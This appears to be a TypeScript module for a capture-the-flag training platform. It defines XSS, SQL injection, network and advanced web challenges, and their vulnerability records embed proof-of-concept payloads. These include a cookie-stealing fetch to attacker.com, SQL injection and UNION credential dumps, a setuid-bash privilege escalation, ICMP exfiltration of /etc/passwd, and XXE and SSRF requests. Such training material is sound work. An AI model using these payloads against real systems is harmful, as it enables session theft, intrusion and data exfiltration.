import { Vulnerability, InsertVulnerability } from '@shared/schema';
import { VulnerabilityType, SeverityLevel } from '@shared/types';
import * as crypto from 'crypto';
import axios from 'axios';
import { convertToDirectReport, sendDirectReport } from './directReporting';

/**
 * Interface representing a CTF challenge
 */
export interface CTFChallenge {
  id: string;
  name: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  category: string;
  targetUrl: string;
  flags: Array<{
    id: string;
    name: string;
    value: string;
    hint: string;
    points: number;
    captured: boolean;
  }>;
  vulnerabilities: InsertVulnerability[];
}

/**
 * Available CTF challenge categories
 */
export const CTFCategories = [
  'web', 
  'network', 
  'crypto', 
  'forensics', 
  'binary',
  'mobile'
];

/**
 * Collection of all available CTF challenges
 */
const ctfChallenges: Map<string, CTFChallenge> = new Map();

/**
 * Active CTF sessions by user
 */
const activeSessions: Map<string, {
  userId: number;
  challengeId: string;
  startTime: Date;
  capturedFlags: string[];
  completedAt?: Date;
}> = new Map();

/**
 * Initialize CTF challenges with real-world scenarios
 */
export function initializeCTFChallenges() {
  // Basic XSS Challenge
  const xssChallenge: CTFChallenge = {
    id: 'ctf-xss-basics',
    name: 'Cross-Site Scripting Fundamentals',
    description: 'Learn how to identify and exploit basic XSS vulnerabilities in a real-world web application.',
    difficulty: 'beginner',
    category: 'web',
    targetUrl: 'https://ctf-challenge.example.com/xss-basics',
    flags: [
      {
        id: crypto.randomUUID(),
        name: 'User Cookie Access',
        value: 'CTF{x55_r3fl3ct3d_4cc355}',
        hint: 'Try to inject a script that can read and exfiltrate cookies.',
        points: 100,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'DOM Manipulation',
        value: 'CTF{d0m_b4s3d_x55_vuln}',
        hint: 'Look for JavaScript that uses location.hash or similar DOM properties.',
        points: 150,
        captured: false
      }
    ],
    vulnerabilities: [
      {
        scanId: 0,
        title: "Reflected XSS in Search Function",
        type: VulnerabilityType.XSS,
        severity: SeverityLevel.HIGH,
        location: "https://ctf-challenge.example.com/xss-basics?search=",
        description: "The search parameter is reflected without proper encoding, allowing script execution.",
        stepsToReproduce: "1. Navigate to the search page\n2. Enter a payload like <script>alert(document.cookie)</script>\n3. Observe that the script executes",
        impact: "An attacker could steal user cookies, perform actions on behalf of the user, or deface the page.",
        remediation: "Implement proper output encoding for user input. Consider implementing Content-Security-Policy headers.",
        proofOfConcept: "https://ctf-challenge.example.com/xss-basics?search=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        cvssScore: "6.5",
        status: "open"
      },
      {
        scanId: 0,
        title: "DOM-based XSS via URL Fragment",
        type: VulnerabilityType.XSS,
        severity: SeverityLevel.MEDIUM,
        location: "https://ctf-challenge.example.com/xss-basics#profile",
        description: "The application unsafely uses location.hash to update the DOM without sanitization.",
        stepsToReproduce: "1. Navigate to the profile page\n2. Add a fragment like #<img src=x onerror=alert(1)>\n3. Observe the JavaScript execution",
        impact: "Attackers could craft malicious links that execute JavaScript when users click them.",
        remediation: "Use safe DOM manipulation methods that sanitize inputs before rendering.",
        proofOfConcept: "https://ctf-challenge.example.com/xss-basics#<img src=x onerror=alert('DOM XSS')>",
        cvssScore: "5.5",
        status: "open"
      }
    ]
  };
  
  // SQL Injection Challenge
  const sqlInjectionChallenge: CTFChallenge = {
    id: 'ctf-sqli-basics',
    name: 'SQL Injection: Breaking the Database',
    description: 'Learn how to identify and exploit SQL injection vulnerabilities in a realistic database-backed application.',
    difficulty: 'intermediate',
    category: 'web',
    targetUrl: 'https://ctf-challenge.example.com/sqli-basics',
    flags: [
      {
        id: crypto.randomUUID(),
        name: 'Data Extraction',
        value: 'CTF{5ql1_d4t4_3xtr4ct10n}',
        hint: 'Try to extract data from other tables using UNION statements.',
        points: 200,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'Admin Access',
        value: 'CTF{4dm1n_5ql1_byp455}',
        hint: 'Find a way to bypass the admin login without knowing the password.',
        points: 250,
        captured: false
      }
    ],
    vulnerabilities: [
      {
        scanId: 0,
        title: "SQL Injection in Login Form",
        type: VulnerabilityType.SQL_INJECTION,
        severity: SeverityLevel.CRITICAL,
        location: "https://ctf-challenge.example.com/sqli-basics/login",
        description: "The login form is vulnerable to SQL injection, allowing authentication bypass and data extraction.",
        stepsToReproduce: "1. Go to the login page\n2. Enter admin' OR '1'='1 as username and any password\n3. Observe successful login bypass",
        impact: "An attacker could bypass authentication, access sensitive data, and potentially execute database commands.",
        remediation: "Use parameterized queries or prepared statements instead of string concatenation.",
        proofOfConcept: "Username: admin' OR '1'='1 -- \nPassword: anything",
        cvssScore: "9.0",
        status: "open"
      },
      {
        scanId: 0,
        title: "Union-Based SQL Injection in Product Search",
        type: VulnerabilityType.SQL_INJECTION,
        severity: SeverityLevel.HIGH,
        location: "https://ctf-challenge.example.com/sqli-basics/products?category=",
        description: "The product search feature allows UNION-based SQL injection attacks, enabling exfiltration of data from other tables.",
        stepsToReproduce: "1. Navigate to the products page\n2. Enter a payload like 1' UNION SELECT 1,username,password,4 FROM users -- \n3. Observe database data being displayed",
        impact: "Attackers can extract sensitive information like usernames and password hashes from any table in the database.",
        remediation: "Implement prepared statements and proper input validation. Consider implementing a WAF and following least privilege for database accounts.",
        proofOfConcept: "https://ctf-challenge.example.com/sqli-basics/products?category=1' UNION SELECT 1,username,password,4 FROM users --",
        cvssScore: "8.5",
        status: "open"
      }
    ]
  };
  
  // Advanced Network Security Challenge
  const networkSecurityChallenge: CTFChallenge = {
    id: 'ctf-network-security',
    name: 'Network Security: Advanced Exploitation',
    description: 'Learn advanced network security concepts by exploiting services and misconfigurations in a simulated network environment.',
    difficulty: 'advanced',
    category: 'network',
    targetUrl: 'https://ctf-challenge.example.com/network-security',
    flags: [
      {
        id: crypto.randomUUID(),
        name: 'Initial Access',
        value: 'CTF{1n1t14l_n3tw0rk_4cc355}',
        hint: 'Look for services running on non-standard ports.',
        points: 300,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'Privilege Escalation',
        value: 'CTF{pr1v_35c_v14_m15c0nf1g}',
        hint: 'After gaining initial access, look for misconfigured service permissions.',
        points: 400,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'Data Exfiltration',
        value: 'CTF{d4t4_3xf1ltr4t10n_m45t3r}',
        hint: 'Find a way to bypass network restrictions to extract sensitive data.',
        points: 500,
        captured: false
      }
    ],
    vulnerabilities: [
      {
        scanId: 0,
        title: "Exposed Insecure Service",
        type: VulnerabilityType.MISCONFIGURATION,
        severity: SeverityLevel.HIGH,
        location: "https://ctf-challenge.example.com/network-security:2222",
        description: "An insecure service with default credentials is exposed on a non-standard port.",
        stepsToReproduce: "1. Scan for open ports\n2. Connect to the service on port 2222\n3. Try default credentials (admin/admin)\n4. Gain initial access",
        impact: "Attackers can gain initial access to the system, providing a foothold for further exploitation.",
        remediation: "Remove unnecessary services, change default credentials, and implement proper access controls.",
        proofOfConcept: "nmap -sV -p 2222 target.com\ntelnet target.com 2222\nUsername: admin\nPassword: admin",
        cvssScore: "8.0",
        status: "open"
      },
      {
        scanId: 0,
        title: "Misconfigured Permissions for Service User",
        type: VulnerabilityType.MISCONFIGURATION,
        severity: SeverityLevel.CRITICAL,
        location: "https://ctf-challenge.example.com/network-security:2222/system",
        description: "The service is running with excessive privileges, allowing privilege escalation.",
        stepsToReproduce: "1. Access the service with default credentials\n2. Use built-in commands to execute system commands\n3. Leverage service permissions to escalate privileges",
        impact: "Attackers can escalate privileges to gain administrative access to the system.",
        remediation: "Follow the principle of least privilege and restrict service account permissions.",
        proofOfConcept: "After login: exec('sudo bash -c \"chmod u+s /bin/bash\"')\nthen: bash -p",
        cvssScore: "9.1",
        status: "open"
      },
      {
        scanId: 0,
        title: "Unrestricted Outbound Traffic",
        type: VulnerabilityType.MISCONFIGURATION,
        severity: SeverityLevel.MEDIUM,
        location: "https://ctf-challenge.example.com/network-security:2222/network",
        description: "The network allows unrestricted outbound traffic, enabling data exfiltration.",
        stepsToReproduce: "1. After gaining access, test outbound connectivity\n2. Use DNS or ICMP for data exfiltration\n3. Extract sensitive information via covert channels",
        impact: "Attackers can exfiltrate sensitive data without detection.",
        remediation: "Implement proper egress filtering and monitor for suspicious outbound traffic.",
        proofOfConcept: "After gaining access: ping -c 1 -p $(cat /etc/passwd | xxd -p) attacker.com",
        cvssScore: "5.9",
        status: "open"
      }
    ]
  };
  
  // Web Application Security Challenge
  const webSecurityChallenge: CTFChallenge = {
    id: 'ctf-web-advanced',
    name: 'Web Security: Beyond the Basics',
    description: 'Advanced web security challenge focusing on modern attack vectors like CSRF, XXE, SSRF, and more.',
    difficulty: 'expert',
    category: 'web',
    targetUrl: 'https://ctf-challenge.example.com/web-advanced',
    flags: [
      {
        id: crypto.randomUUID(),
        name: 'CSRF Token Bypass',
        value: 'CTF{c5rf_t0k3n_byp455}',
        hint: 'Look for implementation flaws in the CSRF protection mechanism.',
        points: 400,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'XXE Data Exfiltration',
        value: 'CTF{xx3_f1l3_r34d_m45t3r}',
        hint: 'Find a way to use XML processing to read sensitive files.',
        points: 450,
        captured: false
      },
      {
        id: crypto.randomUUID(),
        name: 'SSRF Internal Services',
        value: 'CTF{55rf_1nt3rn4l_n3tw0rk_pwn}',
        hint: 'Look for ways to make the server access internal services or endpoints.',
        points: 500,
        captured: false
      }
    ],
    vulnerabilities: [
      {
        scanId: 0,
        title: "CSRF Tokens Tied Only to Session",
        type: VulnerabilityType.CSRF,
        severity: SeverityLevel.HIGH,
        location: "https://ctf-challenge.example.com/web-advanced/profile",
        description: "CSRF tokens are only validated against the session, not the specific action, allowing reuse across different forms.",
        stepsToReproduce: "1. Log in and obtain a valid CSRF token\n2. Use the same token for a different form action than intended\n3. Observe that the action is successful despite using a token from a different form",
        impact: "Attackers can create malicious pages that reuse legitimate CSRF tokens for unauthorized actions.",
        remediation: "Tie CSRF tokens to specific actions/forms and implement proper token validation.",
        proofOfConcept: "Craft a form that submits to the password change endpoint but uses a token from the profile update form.",
        cvssScore: "7.4",
        status: "open"
      },
      {
        scanId: 0,
        title: "XML External Entity (XXE) Injection",
        type: VulnerabilityType.OTHER,
        severity: SeverityLevel.CRITICAL,
        location: "https://ctf-challenge.example.com/web-advanced/import",
        description: "The XML import functionality processes external entities, allowing file read and potential SSRF.",
        stepsToReproduce: "1. Create an XML file with external entity references\n2. Upload the file through the import functionality\n3. Observe that sensitive file contents are displayed in the response",
        impact: "Attackers can read sensitive files, perform SSRF attacks, and potentially execute denial of service attacks.",
        remediation: "Disable XXE processing in the XML parser and implement proper input validation.",
        proofOfConcept: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data><content>&file;</content></data>",
        cvssScore: "8.8",
        status: "open"
      },
      {
        scanId: 0,
        title: "Server-Side Request Forgery (SSRF)",
        type: VulnerabilityType.OTHER,
        severity: SeverityLevel.HIGH,
        location: "https://ctf-challenge.example.com/web-advanced/fetch?url=",
        description: "The application has an URL fetching functionality that can be abused to access internal services.",
        stepsToReproduce: "1. Use the fetch functionality with internal IP addresses or localhost\n2. Try accessing internal services like http://localhost:8080/admin\n3. Observe that the application fetches and displays the response",
        impact: "Attackers can scan internal networks, access restricted services, and bypass network security controls.",
        remediation: "Implement proper URL validation, whitelist allowed domains, and use a proxy service for external requests.",
        proofOfConcept: "https://ctf-challenge.example.com/web-advanced/fetch?url=http://localhost:8080/admin",
        cvssScore: "7.5",
        status: "open"
      }
    ]
  };
  
  // Add challenges to the map
  ctfChallenges.set(xssChallenge.id, xssChallenge);
  ctfChallenges.set(sqlInjectionChallenge.id, sqlInjectionChallenge);
  ctfChallenges.set(networkSecurityChallenge.id, networkSecurityChallenge);
  ctfChallenges.set(webSecurityChallenge.id, webSecurityChallenge);
  
  console.log(`CTF Challenges initialized: ${ctfChallenges.size} challenges available`);
}

/**
 * Get all available CTF challenges
 */
export function getAllCTFChallenges(): CTFChallenge[] {
  return Array.from(ctfChallenges.values()).map(challenge => ({
    ...challenge,
    // Hide flag values when listing all challenges
    flags: challenge.flags.map(flag => ({
      ...flag,
      value: flag.captured ? flag.value : '******'
    }))
  }));
}

/**
 * Get a specific CTF challenge by ID
 */
export function getCTFChallengeById(id: string): CTFChallenge | undefined {
  return ctfChallenges.get(id);
}

/**
 * Start a CTF challenge for a user
 */
export function startCTFChallenge(userId: number, challengeId: string): string {
  // Validate that the challenge exists
  const challenge = ctfChallenges.get(challengeId);
  if (!challenge) {
    throw new Error(`Challenge with ID ${challengeId} not found`);
  }
  
  // Create a new session
  const sessionId = crypto.randomUUID();
  
  activeSessions.set(sessionId, {
    userId,
    challengeId,
    startTime: new Date(),
    capturedFlags: []
  });
  
  return sessionId;
}

/**
 * Submit a flag for a CTF challenge
 */
export function submitCTFFlag(sessionId: string, flagValue: string): {
  success: boolean;
  message: string;
  points?: number;
  completed?: boolean;
} {
  const session = activeSessions.get(sessionId);
  if (!session) {
    return { success: false, message: "Invalid session ID. Please start the challenge again." };
  }
  
  const challenge = ctfChallenges.get(session.challengeId);
  if (!challenge) {
    return { success: false, message: "Challenge not found. Please start the challenge again." };
  }
  
  // Find the flag in the challenge
  const flag = challenge.flags.find(f => f.value === flagValue);
  if (!flag) {
    return { success: false, message: "Incorrect flag. Try again!" };
  }
  
  // Check if flag was already captured
  if (session.capturedFlags.includes(flag.id)) {
    return { success: false, message: "You've already captured this flag!" };
  }
  
  // Mark flag as captured
  flag.captured = true;
  session.capturedFlags.push(flag.id);
  
  // Check if all flags are captured
  const allCaptured = challenge.flags.every(f => session.capturedFlags.includes(f.id));
  if (allCaptured) {
    session.completedAt = new Date();
  }
  
  return {
    success: true,
    message: `Great job! You've captured the flag: ${flag.name}`,
    points: flag.points,
    completed: allCaptured
  };
}

/**
 * Get user's progress in a CTF challenge
 */
export function getCTFProgress(sessionId: string): {
  challenge: CTFChallenge;
  startTime: Date;
  capturedFlags: string[];
  completedAt?: Date;
  totalPoints: number;
  maxPoints: number;
  progress: number;
} | undefined {
  const session = activeSessions.get(sessionId);
  if (!session) {
    return undefined;
  }
  
  const challenge = ctfChallenges.get(session.challengeId);
  if (!challenge) {
    return undefined;
  }
  
  // Calculate points
  const capturedFlags = challenge.flags.filter(f => session.capturedFlags.includes(f.id));
  const totalPoints = capturedFlags.reduce((sum, flag) => sum + flag.points, 0);
  const maxPoints = challenge.flags.reduce((sum, flag) => sum + flag.points, 0);
  const progress = challenge.flags.length > 0 ? (capturedFlags.length / challenge.flags.length) * 100 : 0;
  
  return {
    challenge: {
      ...challenge,
      flags: challenge.flags.map(flag => ({
        ...flag,
        captured: session.capturedFlags.includes(flag.id)
      }))
    },
    startTime: session.startTime,
    capturedFlags: session.capturedFlags,
    completedAt: session.completedAt,
    totalPoints,
    maxPoints,
    progress
  };
}

/**
 * Scan a CTF challenge to find vulnerabilities
 */
export async function scanCTFChallenge(
  sessionId: string, 
  scanId: number
): Promise<{ success: boolean; message?: string; vulnerabilitiesFound?: number }> {
  const session = activeSessions.get(sessionId);
  if (!session) {
    return { success: false, message: "Invalid session ID. Please start the challenge again." };
  }
  
  const challenge = ctfChallenges.get(session.challengeId);
  if (!challenge) {
    return { success: false, message: "Challenge not found. Please start the challenge again." };
  }
  
  try {
    console.log(`[CTF Scan ${scanId}] Starting CTF challenge scan for ${challenge.name}`);
    
    // In a real CTF environment, we would actually scan the challenge infrastructure
    // For now, we'll return the predefined vulnerabilities for the challenge
    
    // Update each vulnerability with the real scan ID
    const vulnerabilities = challenge.vulnerabilities.map(vuln => ({
      ...vuln,
      scanId
    }));
    
    console.log(`[CTF Scan ${scanId}] Found ${vulnerabilities.length} vulnerabilities in challenge ${challenge.id}`);
    
    // Send vulnerabilities as direct reports
    for (const vuln of vulnerabilities) {
      const directReport = convertToDirectReport(vuln as Vulnerability, challenge.targetUrl);
      await sendDirectReport(directReport);
      
      console.log(`[CTF Scan ${scanId}] Sent CTF vulnerability report: ${vuln.title}`);
    }
    
    return {
      success: true,
      message: `CTF Challenge scan completed. Found ${vulnerabilities.length} vulnerabilities.`,
      vulnerabilitiesFound: vulnerabilities.length
    };
  } catch (error) {
    console.error(`[CTF Scan ${scanId}] Error scanning challenge: ${(error as Error).message}`);
    return {
      success: false,
      message: `Failed to scan challenge: ${(error as Error).message}`
    };
  }
}

// Initialize challenges when the module is loaded
initializeCTFChallenges();